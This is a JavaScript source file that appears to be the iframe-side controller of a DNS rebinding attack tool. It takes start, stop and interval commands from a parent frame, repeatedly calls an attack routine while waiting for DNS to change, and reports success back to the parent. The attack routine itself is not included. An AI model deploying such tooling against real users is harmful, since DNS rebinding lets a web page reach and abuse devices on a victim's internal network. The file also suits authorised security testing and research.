var timer;
var frame;
var sessionid;
var xhr;
var interval = 60000;

function initCommsWithParentFrame() {
    window.addEventListener("message", function (e) {
        console.log("attack frame", window.location.hostname, "received message", e.data.cmd);

        switch (e.data.cmd) {
            case "interval":
                interval = parseInt(e.data.param) * 1000;
                break;
            case "indextoken":
                indextoken = e.data.param;
                break;
            case "stop":
                clearInterval(timer);
                break;
            case "start":
                timer = setInterval(attack, interval);
                console.log("frame", window.location.hostname, "waiting", interval,
                    "milliseconds for dns update");
                break;
        }
    });
}

// Notify the parent that attack frame is loaded.
function begin() {
    window.parent.postMessage({
        status: "start"
    }, "*");
}

// checks if Response is '200' and return Promise Body.text()
// otherwise throw an error with errorString
function responseOKOrFail(errorString) {
    return function (r) {
        if (r.ok) {
            console.log("attack frame ", window.location.hostname, " received a response");
            return r.text()
        } else {
            throw new Error(errorString)
        }
    }
}

// terminates attack and inform parent frame
function attackSuccess(message) {
    console.log(message);
    clearInterval(timer); //stop attack
    window.parent.postMessage({
        status: "success",
        response: message
    }, "*");
}

initCommsWithParentFrame();